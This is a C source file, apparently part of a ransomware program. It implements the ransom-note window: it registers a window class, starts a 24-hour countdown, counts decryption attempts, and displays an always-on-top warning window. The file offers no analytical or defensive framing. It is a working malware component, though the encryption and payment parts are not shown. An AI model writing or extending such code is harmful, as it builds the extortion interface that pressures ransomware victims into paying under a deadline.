#include "gui_main.h"
#include "gui_resources.h"
#include "gui_window.h"
#include "gui_utils.h"

/* ====================================================================
 * ShowRansomNoteWindow — entry point: register class, create window,
 *                         run message loop, cleanup
 * ==================================================================== */
void ShowRansomNoteWindow(void) {
    HMODULE hInst = GetModuleHandle(NULL);

    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_WIN95_CLASSES };
    InitCommonControlsEx(&icc);

    CreateResources();

    WNDCLASSEXW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = RansomWndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = g_hbrBg;
    wc.lpszClassName = WC_RANSOM;
    wc.hIcon         = LoadIcon(NULL, IDI_WARNING);
    wc.hIconSm       = LoadIcon(NULL, IDI_WARNING);
    RegisterClassExW(&wc);

    /* Initialize countdown: 24 hours from now */
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    g_timerEndFileTime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    g_timerEndFileTime += (ULONGLONG)24 * 60 * 60 * 10000000ULL; /* 24 hours */
    g_decryptAttempts = 0;

    int winW = 860, winH = 750;
    int scrW = GetSystemMetrics(SM_CXSCREEN);
    int scrH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (scrW - winW) / 2;
    int posY = (scrH - winH) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        WC_RANSOM, WIN_TITLE,
        WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
        posX, posY, winW, winH,
        NULL, NULL, hInst, NULL
    );

    if (!hWnd) { DestroyResources(); return; }

    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DestroyResources();
}